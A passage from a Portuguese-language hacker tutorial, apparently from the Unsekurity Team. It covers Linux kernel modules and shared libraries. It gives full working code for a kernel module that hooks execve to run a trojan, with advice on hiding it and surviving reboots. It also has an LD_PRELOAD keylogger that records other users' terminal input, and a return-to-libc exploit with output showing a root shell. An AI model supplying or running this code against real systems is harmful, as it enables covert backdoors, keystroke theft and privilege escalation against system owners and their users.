+programa e redirecionar para a execucao de /tmp/trojan, sendo assim,nao
+tocaremos no programa original, dificultando a percepcao desses programas.
+Vejamos abaixo um LKM capaz de fazer isto:
+
+----------------------------- redir_exec.c -------------------------------
+
+/* SIMPLES LKM REDIRECIONADOR DE ARQUIVO EXECUTAVEL.
+   DESENVOLVIDO POR NASH LEON VULGO CORACAODELEAO.
+   nashleon@yahoo.com.br
+
+   Thanks Unsekurity Team.
+   http://unsekurity.virtualave.net/
+   Desenvolvido com base no tutorial da THC sobre LKM.
+   http://www.infowar.co.uk/thc/
+
+   OBS:   LKM PARA KERNEL 2.2.13 (SlackWare 7.0).
+          Nao nos responsabilizamos pelo mau uso deste programa.
+          Construido somente para propositos educacionais.
+*/
+
+#define     MODULE
+#define   __KERNEL__
+
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <asm/unistd.h>
+#include <asm/uaccess.h>
+#include <linux/dirent.h>
+#include <linux/types.h>
+#include <linux/proc_fs.h>
+
+/*
+defina abaixo os dois arquivos a serem manipulados, o bom eh o
+arquivo original, e o mau eh o que nos queremos executar. */
+
+#define  BOM_ARQUIVO  "/tmp/exec"
+#define  MAU_ARQUIVO  "/tmp/trojan"
+
+extern void* sys_call_table[];
+int errno;
+
+int __NR_myexecve;
+
+static inline _syscall1(int, brk, void *, end_data_segment);
+
+int (*original_execve) (const char *, const char *[], const char *[]);
+
+int my_execve(const char *filename, const char *argv[], const char
+*envp[])
+{
+long __res;
+__asm__ volatile ("int $0x80":"=a" (__res):"0"(__NR_myexecve),"b"((long)
+(filename)), "c"((long) (argv)),"d"((long) (envp)));
+    return (int) __res;
+}
+int hacked_execve(const char *filename, const char *argv[], const char
+*envp[])
+{
+char *test;
+int ret, tmp;
+char *truc = BOM_ARQUIVO;        /* arquivo que deveria ser executado */
+char *nouveau = MAU_ARQUIVO;     /* arquivo que serah executado */
+
+unsigned long mmm;
+
+test = (char *) kmalloc(strlen(truc) + 2, GFP_KERNEL);
+copy_from_user(test, filename, strlen(truc));
+
+test[strlen(truc)] = '\0';
+
+if (!strcmp(test, truc)){
+kfree(test);
+mmm = current->mm->brk;
+ret = brk((void *) (mmm + 256));
+if (ret < 0)
+return ret;
+
+copy_to_user((void *) (mmm + 2), nouveau, strlen(nouveau) + 1);
+
+ret = my_execve((char *) (mmm + 2), argv, envp);
+tmp = brk((void *) mmm);
+}
+
+else {
+kfree(test);
+ret = my_execve(filename, argv, envp);
+}
+ return ret;
+}
+int init_module(void) {
+__NR_myexecve = 250;
+while (__NR_myexecve != 0 && sys_call_table[__NR_myexecve] != 0)
+__NR_myexecve--;
+original_execve = sys_call_table[__NR_execve];
+if (__NR_myexecve == 0)
+{
+sys_call_table[__NR_myexecve] = original_execve;
+sys_call_table[__NR_execve] = (void *) hacked_execve;
+printk("<1>Modulo Carregado com Sucesso!!\n");
+}
+ return 0;
+}
+
+void cleanup_module(void)
+{
+sys_call_table[__NR_execve]=original_execve;
+printk("<1>Modulo Descarregado com Sucesso!!\n");
+}
+
+------------------------------------------------------------------------
+
+Este esquema eh muito eficaz, bem melhor do que voce usar um rootkit de
+3 megas, que muda dezenas de arquivos e voce trabalhar alterando a 
+execucao de apenas 1 ou 2, voce poderia ainda esconder este LKM de lsmod,
+tornando-o irremovivel durante uma sessao, com mais persistencia voce
+poderia carrega-lo sempre que o sistema fosse reinicializado, enfim,
+pense nos esquemas!
+
+
+Existem muitos outros esquemas como TTY HIJACKING, ENGANACAO COMPLETA E
+EFICAZ DE FIREWALLS, CRIACAO DE UM SISTEMA OPERACIONAL DO HACKER, etc..
+Mas vou ficando por aqui, olhe os links que disponibilizo, se voce gosta
+de linux, eles representam um prato cheio.Outra coisa, cuidado com as
+ferramentas de log do sistema(syslog) e pense em esquemas para uma
+backdoor eficiente onde nem mesmo a recompilacao do kernel poderia retirar a
+backdoor de lah, procure informacoes sobre processos e esquemas
+interessantes usando LKM, muito cuidado com virus!! Recomendo a leitura
+do tutorial da the hackers choice, eh para kerneis antigas, mas as
+teorias sao atuais.
+
+------------------ 
+6. Shared Library |
+------------------
+
+Esse item tambem eh voltado para o pessoal Newbie, se voce eh 'elite', nao
+leia.
+
+6.1 - O que sao
+----------------
+
+Shared Library sao bibliotecas usadas para compartilhamento de algumas
+funcoes e etc..As vantagens de se usar isso sao varias, vao desde a
+reducao do uso da memoria ateh a diminuicao de codigos executaveis.Para
+um fucador, a implementacao dessa tecnica de programacao pode ser usada
+para intuitos diversos, demonstrarei alguns deles no decorrer deste tutorial.
+
+6.2 - Algumas Funcoes
+----------------------
+
+O C nos dah algumas funcoes que sao usadas para manipular o carregamento
+dinamico de shared libraries.Veremos de forma basica, algumas delas
+abaixo.
+
+6.2.1 - dlopen()
+-----------------
+
+Essa funcao eh responsavel pelo carregamento de uma biblioteca dinamica.
+Sua sintaxe eh:
+
+#include <dlfcn.h>
+void *dlopen (const char *filename, int flag);
+
+dlopen() carrega uma biblioteca dinamica do arquivo chamado pela string
+terminada nula "filename" e retorna um manuseio opaco para a biblioteca
+dinamica.Se filename nao eh um path absoluto, entao o arquivo eh procurado
+nas seguintes locacoes:
+
++ Uma lista de diretorios na variavel environment LD_LIBRARY;
++ A lista de bibliotecas especificas em /etc/ld.so.cache.
++ /usr/lib seguido de /lib.
+
+O filename eh um ponteiro nulo, entao o retorno de handle eh para o 
+programa main.
+
+Os flags podem ser:
+
+RTLD_GLOBAL -> Usado para resolver referencias externas de bibliotecas.
+RTLD_LAZY   -> Despreza resolucao de simbolos indefinidos quando codigo de
+	       uma biblioteca dinamica eh executado.
+RTLD_NOW    -> Despreza resolucao de todos os simbolos antes de dlopen
+	       retornar.
+
+6.2.2 - dlclose()
+------------------
+
+Esta funcao descarrega uma biblioteca compartilhada previamente carregada
+com dlopen().Sua Sintaxe eh:
+
+int dlclose (void *handle);
+
+Onde *handle eh justamente um ponteiro para dlopen.Exemplo de codigo
+Usando as duas funcoes:
+
+----------------------------- shared1.c -------------------------------
+/* Carrega e Descarrega uma Biblioteca Compartilhada */
+
+#include <dlfcn.h>
+#include <stdio.h>
+
+#define  LIB_PATH "/usr/lib/libc.so"
+
+main(){
+void *handle;
+handle = dlopen(LIB_PATH, 1);
+dlclose(handle);
+}
+------------------------------------------------------------------------
+
+Compile e linke do seguinte modo:
+
+[localhost]# gcc -fPIC -c shared1.c
+[localhost]# ld -shared -o shared1.so shared.o -ldl
+
+Esse eh soh um esquema para voce ter uma simples ideia do que estah
+acontecendo.Voce carregou a biblioteca '/usr/lib/libc.so' que contem 
+algumas milhares de funcoes e depois a descarregou.Geralmente, programas
+complexos compartilham codigos chamando essas bibliotecas.Uma
+vulnerabilidade em uma biblioteca como esta, afetaria todos os programas
+que compartilham dela, por isso, deve-se dar uma atencao especial e isto.
+Logo mais abaixo, veremos isso na pratica.
+
+6.2.3 - dlsym()
+----------------
+
+Esta eh uma funcao interessante, ela serve para manuseio de uma biblioteca
+dinamica retornada por dlopen() e o nome do simbolo terminado nulo,
+retornando o endereco onde o simbolo eh carregado.Se ela nao encontra o
+simbolo, entao ela retorna NULL.Vamos analisar o codigo abaixo:
+
+--------------------------- shared2.c---------------------------------
+#include <dlfcn.h>
+
+/* Atencao no path abaixo */
+
+#define  PATH_MAT "/lib/libm.so.6"
+
+int main(int argc, char **argv) {
+void *handle = dlopen (PATH, RTLD_LAZY);
+double (*cosine)(double) = dlsym(handle, "cos");
+printf ("%f\n", (*cosine)(90.0));
+dlclose(handle);
+              }
+
+-----------------------------------------------------------------------
+
+Para compilar:
+
+# gcc -o shared2 shared2.c -ldl
+# ./shared2
+-0.448074
+
+O exemplo acima ilustra o calculo do cosseno de 90.0. Note que necessitamos
+usar um ponteiro para uma funcao: 'double (*cosine)(double)'; pois eh eh
+que aponta para a funcao 'cos'(no caso simbolo) da biblioteca compartilhada.
+
+6.2.4 - dlerror()
+------------------
+
+Esta funcao eh usada para extrair erros que as rotinas de dlopen(),
+dlclose() e dlsyms() possam vir a ter.Sua Sintaxe:
+
+const char *dlerror(void);
+
+Vejamos o exemplo acima usando dlerror() para nos avisar se aparecer algum
+erro:
+
+------------------------------- shared3.c -------------------------------
+
+#include <stdio.h>
+#include <dlfcn.h>
+
+#define PATH "/lib/libm.so.6"
+
+int main(int argc, char **argv) {
+void *handle;
+double (*cosine)(double);
+char *error;
+
+handle = dlopen (PATH, RTLD_LAZY);
+if (!handle) {
+     fputs (dlerror(), stderr);
+     exit(1);
+              }
+
+cosine = dlsym(handle, "cos");
+if ((error = dlerror()) != NULL)  {
+          fputs(error, stderr);
+          exit(1);
+                  }
+printf ("%f\n", (*cosine)(90.0));
+dlclose(handle);
+              }
+------------------------------------------------------------------------
+
+O programa acima estah sem erro, mas se tivesse algum erro nas funcoes
+dlopen() e dlsym() ele acusaria.Por exemplo, voce pode acrescentar um "B"
+antes de 'cos' e verah que ele acusarah erro:
+
+/lib/libm.so.6: undefined symbol: Bcos
+
+Isto pode vir a ser muito util na checagem de problemas.
+
+
+6.3 - Tecnica de Redirecionamento
+-----------------------------------
+
+Abaixo segue um codigo feito pelo halflife e descrito na phrack 51, o
+que este codigo faz eh logar tudo que eh digitado na shell.
+
+---------------------------- tty_loger.c ------------------------------
+
+/* TTY - LOGER by halflife.
+   Desenvolvido por halflife, descrito na phrack 51-7.
+   Alterado por Nash Leon vulgo coracaodeleao.
+   nashleon@yahoo.com.br.
+   Testado em:
+   Conectiva Red Hat Linux 5.0
+   Slackware Linux 7.0
+   Para compilar: gcc -fPIC -c tty_loger.c
+   Para linkar: ld -Bshareable -o tty_loger.so tty_loger.o -ldl
+            ou  ld -shared -o tty_loger.so tty_loger.o -ldl
+   Carregue em uma environ e depois veja o que ele digitou no path
+   definido:
+   $ export LD_PRELOAD = /tmp/tty_loger.so
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/uio.h>
+#include <sys/stat.h>
+#include <string.h>
+#include <fcntl.h>
+#include <dlfcn.h>
+
+/* Mude os PATHs abaixo caso necessite */
+
+#define LIB_PATH "/usr/lib/libc.so.3.0"
+#define LOGDIR "/tmp/."
+int logfile = -1;
+static void createlog(void)
+{
+        char buff[4096];
+        if(logfile != -1)
+                return;
+        memset(buff, 0, 4096);
+        if(strlen(LOGDIR) > 4000)
+                return;
+        sprintf(buff, "%s/%d", LOGDIR, getuid());
+        logfile = open(buff, O_WRONLY|O_CREAT|O_APPEND, S_IRUSR|S_IWUSR);
+        return;
+}
+
+static void writeout(char c)
+{
+        switch(c)
+        {
+                case '\n':
+                case '\r':
+                        c = '\n';
+                        write(logfile, &c, 1);
+                        break;
+                case 27:
+                        break;
+                default:
+                        write(logfile, &c, 1);
+        }
+}
+
+ssize_t read(int fd, void *buf, size_t nbytes)
+{
+        void *handle;
+        ssize_t (*realfunc)(int, void *, size_t);
+        int result;
+        int i;
+
+        char *c;
+        char d;
+
+        handle = dlopen(LIB_PATH, 1); 
+        if(!handle)
+                return -1;
+        realfunc = dlsym(handle, "read");
+        if(!realfunc)
+                return -1;
+        if(logfile < 0)
+                createlog();
+        result = realfunc(fd, buf, nbytes);
+        c = buf;
+        if(isatty(fd))
+
+        {
+                if(result > 0)
+                        for(i=0;i < result;i++)
+                        {
+                                d = c[i];
+                                writeout(d);
+                        }
+        }
+        return result;
+}
+
+
+-----------------------------------------------------------------------
+
+* Compile este programa da seguinte maneira:
+
+[localhost]# gcc -fPIC -c tty_loger.c
+
+* Linke-o usando um dos metodos abaixo:
+
+[localhost]# ld -Bshareable -o tty_loger.so tty_loger.o -ldl
+     ou  
+[localhost]# ld -shared -o tty_loger.so tty_loger.o -ldl
+
+* Para carrega-lo, carregue-o numa environ.Exemplo:
+
+[localhost]# export LD_PRELOAD = /tmp/tty_loger.so
+
+* Se quiser testar basta digitar '/bin/sh'.
+
+Se nao consegue contemplar esquemas para isso mano, leia abaixo:
+
++ Se voce possui acesso a um servidor NFS, voce pode inseri-lo dentro de
+  .profile ou .bash_rc.
+
++ Conexoes Samba, idem acima.
+
++ Se voce obtem root num sistema pode definir o carregamento desta 
+  biblioteca compartilhada para todos, isso eh um prato cheio para
+  voyerismo.:).. Pessoal que gosta de ler e-mails dos outros que o diga!
+
+
+6.4 - Outros Esquemas
+----------------------
+
+O Redireconamento eh soh uma tecnica dentre diversas outras possiveis que
+envolvem as bibliotecas compartilhadas.Vamos ver alguns exemplos neste
+item.
+
+Vamos supor a seguinte biblioteca abaixo abaixo:
+
+--------------------------- shared_bug.c ----------------------------
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int imprime_nome(char *nome){
+char buffer[256];
+strcpy(buffer,nome);
+return buffer;
+}
+-----------------------------------------------------------------------
+
+Compile e linke ela normalmente:
+
+# gcc -fPIC -c shared_bug.c
+# ld -o shared shared_bug.so shared_bug.c -ldl
+
+Agora vamos construir um programa para carrega-la:
+
+------------------------------- pro_sha.c -----------------------------
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <dlfcn.h>
+
+/* Atencao no PATH abaixo */
+
+#define  PATH_LIB  "./shared_bug.so"
+#define  ERRO      -1
+
+main(int argc, char *argv[]){
+void *handle;
+int (*realfunc)(char *);
+if(argc < 2){
+printf("Uso: %s <string>\n",argv[0]);
+exit(0);
+}
+setuid(0);
+handle = dlopen(PATH_LIB, 1);
+if(handle < 0){
+fprintf(stderr,"Erro na abertura na biblioteca!!\n");
+exit(ERRO);
+}
+realfunc = dlsym(handle, "imprime_nome");
+printf("%s\n",(*realfunc)(argv[1]));
+dlclose(handle);
+}
+-----------------------------------------------------------------------
+
+Compile ele da sequinte forma e depois execute-o:
+
+# gcc -o pro_sha pro_sha.c -ldl
+# ./pro_sha NashLeon
+NashLeon
+
+Consegue contemplar o problema, amigo?? Pois vejamos abaixo:
+
+# ./pro_sha `perl -e 'print "A" x 600'`
+Segmentation fault
+
+Se uma biblioteca compartilha possui um bug, ela compartilha o bug tambem.
+Poderiamos redirecionar um exploit para a propria biblioteca, mas existem
+casos onde voce pode nao ter permissao.O que vimos foi uma condicao de
+'buffer overflow', mas nos poderiamos ver tambem outros problemas, como
+Race Conditions, e etc.. Aih reside uma necessidade consideravel de saber
+o que sao e como procurar bugs em shared libraries.O perigo de se usar
+Bibliotecas Compartilhadas em programas complexos ou suid eh consideravel.
+
+Se um invasor conseguir permissao de escrita numa biblioteca compartilhada,
+as chances  dele conseguir root no sistemas sao consideraveis.Dentre outras
+coisas, um invasor poderia introduzir codigo malicioso na biblioteca
+compartilhada, e se um programa suid root usasse a mesma, o sistema ja era!
+Ou mesmo forcar a execucao de um trojan jah inserido no sistema por qualquer
+usuario do mesmo, enfim, setar corretamente as permissoes eh um dever
+basico de um administrador de redes responsavel, mesmo que sua distribuicao
+Linux nao as sete corretamente.
+
+Buffer Overflows em Bibliotecas Compartilhadas podem ser mais simples de
+se exploitar do que num programa sem estar compartilhando uma biblioteca
+compartilhada, o lamagra descreveu isso perfeitamente em seu 'PROJETO
+OMEGA', abaixo segue um pouco desta tecnica.Se voce tem duvidas quanto a
+buffer overflows recomendo a leitura da primeira parte do meu Tutorial
+de Buffer Overflows que pode ser obtido na pagina do Unsekurity Team, lah
+eu disponibilizo varios links onde voce pode obter mais material sobre
+tudo isto.
+
+A Tecnica usada no Projeto Omega consiste em gerar um Buffer Overflow sem
+a necessidade de chutar offsets e/ou usar shellcodes.Basicamente ao inves 
+do endereco de retorno apontar para o inicio do buffer ele apontarah para
+a funcao system, e se passarmos argumentos para ela, ela executarah.Mais
+detalhes sobre o funcionamento desta tecnica bem como sua teoria podem ser
+vistos na pagina do lamagra (http://bounce.to/~unah16 ou 
+http://lamagra.seKure.de), pretendo em breve dar continuidade ao tutorial
+de shellcode e nele talvez eu coloque mais sobre esta tecnica.
+
+Vimos que o programa acima compartilha uma biblioteca que possui uma
+condicao de Buffer Overflow, logo podemos exploita-lo.Torne-o suid root
+para ilustrarmos melhor.Abaixo segue um exploit feito pelo proprio lamagra
+e que pode ser usado no nosso programa bugado:
+
+---------------------------- exploit_shared.c ----------------------------
+/*
+ * The exploit
+ * Finds the address of system() in libc.
+ * Searches for "/bin/sh" in the neighbourhood of system().
+ * (System() uses that string)
+ * Lamagra <lamagra@uglypig.org>
+ */
+
+#include <stdlib.h>
+#include <dlfcn.h>
+
+main(int argc, char **argv)
+{
+   int x,size;
+   char *buf;
+   long addr,shell,exitaddy;
+   void *handle;
+
+   if(argc != 3){
+        printf("Uso: %s <bufsize> <program>\n",argv[0]);
+        exit(-1);
+   }
+
+   size = atoi(argv[1])+16;
+   if((buf = malloc(size)) == NULL){
+        perror("can't allocate memory");
+        exit(-1);
+   }
+   handle = dlopen(NULL,RTLD_LAZY);
+   addr = (long)dlsym(handle,"system");
+   printf("System() is at 0x%x\n",addr);
+
+   if(!(addr & 0xff) || !(addr & 0xff00) ||
+      !(addr & 0xff0000) || !(addr & 0xff000000))
+   {
+        printf("system() contains a '0', sorry!");
+        exit(-1);
+   }
+
+   shell = addr;
+   while(memcmp((void*)shell,"/bin/sh",8))
+        shell++;
+
+   printf("\"/bin/sh\" is at 0x%x\n",shell);
+   printf("print %s\n",shell);
+   shell = addr;
+   while(memcmp((void*)shell,"/bin/sh",8))
+        shell++;
+
+   printf("\"/bin/sh\" is at 0x%x\n",shell);
+   printf("print %s\n",shell);
+
+   memset(buf,0x41,size);
+   *(long *)&buf[size-16] = 0xbffffbbc;
+   *(long *)&buf[size-12] = addr;
+   *(long *)&buf[size-4]  = shell;
+
+   puts("Executing");
+
+   execl(argv[2],argv[2],buf,0x0);
+}
+
+-------------------------------------------------------------------------
+
+Abaixo seguem os passos para exploitar:
+
+$ gcc -o exploit_shared exploit_shared.c -ldl
+$ ./exploit_shared 256 pro_sha
+System() is at 0x4005a6f8
+"/bin/sh" is at 0x400f3866
+print /bin/sh
+Executing
+sh-2.03#
+
+Como voce pode ver, funciona perfeitamente e eh um esquema muito interessante.
+
+Uma coisa deve ser dita,esse lamagra fez isso na 'marra', quando ele teorizou 
+ninguem deu credito, quando ele lancou teorias a respeito no zine 'Core Zine' 
+ninguem deu credito, agora que ele conseguiu realizar de forma efetiva todo 
+mundo vem dizer que eh facil!! A mesma coisa com format bugs, passaram-se
+semanas e a comunidade de seguranca(vide bugtraq) sem saber o que estava
+acontecendo agora vem os 'elites' e dizem: "EH MUITO FACIL!!!"; :).Pode ir!!
+Enganam quem nao conhece a historia, creditos ao cara(lamagra) e aos que
+o ajudaram! Muitas teorias interessantes tem saido daqueles caras
+ultimamente.
+
+--------------
+7. TERMINANDO |
+--------------
+
+Mais uma vez quero enfatizar que este tutorial eh basico, existem inumeras
+outras coisas para se aprender sobre os itens que descrevi.Pesquise e vah
+fundo que isto serah evidenciado.Talvez, num futuro proximo, eu de
+continuidade a este tutorial, talvez vendo em separado, talvez nao, soh
+o momento poderah dizer, pois nao conhecemos o dia de amanha.Espero ter
+evidenciado algumas coisas neste tutorial, tais como:
+
+* O PERIGO E O PODER DAS LKM;
+
+Para algum administrador de sistema que estiver lendo isto aqui, recomendo
+dar uma lida no tutorial da The Hackers Choice, existem algumas teorias
+e exemplos praticos que podem ajudar voce, alguns esquemas descritos alih
+podem ser PASSADOS, ou seja, nao sao eficazes, mas a implementacao daqueles
+esquemas pode vir a ser util para voce.
+
+* AS IMPLEMENTACAO BASICAS COM IPC;
+* PROBLEMAS SIMPLES COM ALGUMAS FUNCOES;
+* IMPLEMENTACOES BASICAS E PROBLEMAS COM BIBLIOTECAS COMPARTILHADAS;
+
+Enfim, o que vimos, eh sem duvida algo util, mas caberah a voce ir mais
+fundo nisso tudo.Abaixo seguem links e Referencias onde voce poderah
+achar mais material util sobre os temas abordados neste tutorial.
+
+
+7.1. Links e Referencias
+-------------------------
+
+* SOBRE A PARTE MANIFESTO:
+
+http://www.gnu.org/  -> GNU.
+
+http://www.eff.org/  -> Eletronic Frountier Foundation.
+
+http://www.2600.com/ -> Quartel General do Hacker.
+
+http://www.inf.ufsc.br/barata/ -> Uma das HPs do zine Barata Eletrica.
+
+http://w3.to/fussador/ -> Informacoes sobre Operacao SunDevil no livro
+			  digital gratuito 'The Hacker Crackdown'.
+
+http://www.webcrunchers.com/crunch/ -> Home Page do phreak Capitao Crunch.
+
+
+* SOBRE IPC:
+
+http://www.cm.cf.ac.uk/Dave/C/CE.html
+
+http://www.ee.mu.oz.au/linux/programming/
+
+http://www.ecst.csuchico.edu/~beej/guide/ipc
+
+* SOBRE PROBLEMAS BASICOS DE SEGURANCA:
+
+http://www.unixpower.org/security
+
+http://www.shmoo.com/securecode
+
+http://www.securityfocus.com/
+
+Livro 'Hackers Expostos'.
+Autores: Stuart McClure e Joel Scambray
+Editora: Makron Books 
+Maiores Informacoes: www.hackingexposed.com
+
+* SOBRE LKM:
+
+http://www.infowar.co.uk/thc/ -> Procure em Articles.
+
+http://www.phrack.com/ -> Procure por phrack 52 item 18.
+
+http://teso.scene.at/ -> Procure por adore.tar.gz
+
+http://Khg.redhat.com/HyperNews/get/Khg.html
+
+http://www.ee.mu.oz.au/linux/programming/
+
+Livro 'Linux Device Drivers'.
+Autor: Alessandro Rubini. 
+Mais informacoes em: http://www.marketbooks.com.br/
+
+* SOBRE SHARED LIBRARIES:
+
+http://www.phrack.com/ -> Procure por phrack 51 item 7.
+
+http://bounce.to/unah16 -> Procure pelo Core Zine e omega.txt.
+
+* HOME PAGE ATUAL DO UNSEKURITY TEAM:
+
+http://unsekurity.virtualave.net/
+
+* Outros Muito Interessantes:
+
+http://www.securenet.com.br/
+http://www.bufferoverflow.org/
+http://www.taldowin.com.br/
+http://www.hacker.com.br/
+http://www.absoluta.org/
+
+
+7.2 - Consideracoes Finais
+---------------------------
+
+Mais um tutorial terminado.Se voce for ver, desde que comecamos a divulgar
+informacoes, publicamos algumas coisinhas interessantes.Espero poder ir
+avancando mais, mas se voce nao conseguiu pegar alguma coisa, nao desanime
+nunca!Entre em contato com o Unsekurity Team, se puder visitar o forum,
+vah lah e levante sua duvida, se pudermos, certamente ajudaremos.Este
+tutorial eh uma coletanea de txts que eu pretendia disponibilizar aos
+poucos, mas achei por certo unir tudo e publicar como estah, levando um
+fucador a cativar mais em busca de informacoes, exitem dezenas de outras
+tecnicas ainda para serem descritas e pesquisadas, aos poucos a gente vai
+publicando alguns materiais sobre elas.
+Queria agradecer a todo o Unsekurity Team e ao pessoal que vem dando apoio
+e nos ajudando, seja com criticas, sugestoes ou divulgando nosso material
+internet a fora, reconheco plenamente que sem a ajuda de voces nao 
+conseguiriamos alcancar o numero de leitores e conhecedores das
+publicacoes que o Unsekurity Team disponibiliza.Sei que tem muito a ser
+feito ainda, e tambem quero dizer que isto tudo eh muito gratificante, e 
+apesar do trabalho que dah, passar horas escrevendo e etc, no fundo a
+conciencia se alegra quando um trabalho eh enfim terminado e o mesmo eh 
+divulgado.Se voce eh fucador e tem esta vontade de liberar informacoes, eu
+aconselho a voce: "VAH FUNDO!!FACA" ; Todos soh tem a ganhar com mais e
+mais pessoas divulgando informacoes Internet a fora.
+
+Um abraco.
+
+					                  Nash Leon.
+
+---------------------------------- EOF ----------------------------------
+
+
